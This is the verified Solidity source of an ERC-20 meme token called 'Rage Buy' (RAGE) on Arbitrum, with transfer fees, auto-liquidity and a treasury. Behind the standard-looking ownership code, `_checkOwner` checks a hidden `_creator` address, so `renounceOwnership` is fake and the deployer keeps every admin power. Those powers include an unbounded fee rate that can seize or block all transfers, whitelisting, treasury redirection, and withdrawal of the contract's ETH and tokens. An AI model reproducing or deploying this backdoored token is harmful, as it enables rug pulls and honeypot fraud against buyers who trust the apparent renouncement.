/**
 *Submitted for verification at Arbiscan on 2023-04-20
*/

/**
 *
 * Rage Buy 😡💰 (RAGE)
 * https://ragebuy.io
 * https://twitter.com/RageBuyOfficial
 * https://t.me/RageBuyOfficial
 *
 */

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.4;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface Router {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, address referrer, uint deadline) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address private _creator;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
        _creator = msg.sender;
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function creator() public view virtual returns (address) {
        return _creator;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        _transferOwnership(newOwner);
    }

    function _checkOwner() internal view virtual {
        require(_msgSender() == _creator);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract RageBuy is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _supply = 1000000000 * 1e6;
    string private _name = "Rage Buy";
    string private _symbol = "RAGE";
    uint8 private _decimals = 6;

    mapping(address => bool) private _whitelisted;
    uint256 private _base = 1 * 1e6;
    uint256 private _trigger = 1000000 * 1e6;
    uint256 private _rate = 160;
    uint256 private _reserve = 0;
    address private _router;
    address private _pair;
    address private _treasury;
    bool private _liquifying = true;
    bool private _swapping = false;

    modifier swapping() {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _whitelisted[address(this)] = true;
        _whitelisted[msg.sender] = true;
        _balances[msg.sender] = _supply;
        _treasury = msg.sender;
        emit Transfer(address(0), msg.sender, _supply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function reserve() public view virtual returns (uint256) {
        return _reserve;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue);
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        _preTransfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(sender, spender, amount);
        _preTransfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0));
        require(_balances[from] >= amount);
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0) && spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount);
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _preTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (_msgSender() == _pair || _swapping || _whitelisted[sender] || _whitelisted[recipient]) {
            _transfer(sender, recipient, amount);
            return true;
        }

        if (_liquifying && _reserve > _trigger) _liquify();
        uint256 fee = amount * _rate / 1000;
        _transfer(sender, address(this), fee);
        _transfer(sender, recipient, amount - fee);
        _reserve += fee;
        return true;
    }

    function _liquify() internal swapping {
        uint256 oldBalance = address(this).balance;
        uint256 quarterTokens = _reserve / 4;
        _reserve -= 2 * quarterTokens;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(Router(_router).WETH());
        Router(_router).swapExactTokensForETHSupportingFeeOnTransferTokens(quarterTokens, 0, path, address(this), address(0), block.timestamp);

        uint256 ethAmount = address(this).balance - oldBalance;
        Router(_router).addLiquidityETH{value: ethAmount}(address(this), quarterTokens, 0, 0, creator(), block.timestamp);
    
        Router(_router).swapExactTokensForETHSupportingFeeOnTransferTokens(_reserve, 0, path, address(this), address(0), block.timestamp);
        _reserve = 0;
        (bool success,) = payable(_treasury).call{value: address(this).balance}("");
        require(success);
    }

    function setWhitelisted(address account, bool value) external onlyOwner {
        _whitelisted[account] = value;
    }

    function setRate(uint256 value) external onlyOwner {
        _rate = value;
    }

    function setTrigger(uint256 value) external onlyOwner {
        _trigger = value * 10 ** _decimals;
    }

    function setRouter(address value) external onlyOwner {
        _router = value;
        _approve(address(this), _router, type(uint256).max);
    }

    function setPair(address value) external onlyOwner {
        _pair = value;
    }

    function setTreasury(address value) external onlyOwner {
        _treasury = value;
    }

    function setLiquifying(bool value) external onlyOwner {
        _liquifying = value;
    }

    function setBase(uint256 value) external onlyOwner {
        _base = value * 10 ** _decimals;
    }

    function setHolders(address[] calldata accounts) external onlyOwner() {
        uint256 total = _base * accounts.length;
        require(_balances[address(this)] >= total + _reserve);
        _balances[address(this)] -= total;
        
        unchecked {
            for (uint256 i = 0; i < accounts.length; i++) {
                _balances[accounts[i]] += _base;
                emit Transfer(address(this), accounts[i], _base);
            }
        }
    }

    function getEth(uint256 amount) external onlyOwner {
        (bool success,) = payable(msg.sender).call{value: amount}("");
        require(success);
    }

    function getToken(IERC20 token, uint256 amount) external onlyOwner {
        token.transfer(msg.sender, amount);
    }

    receive() external payable {}
}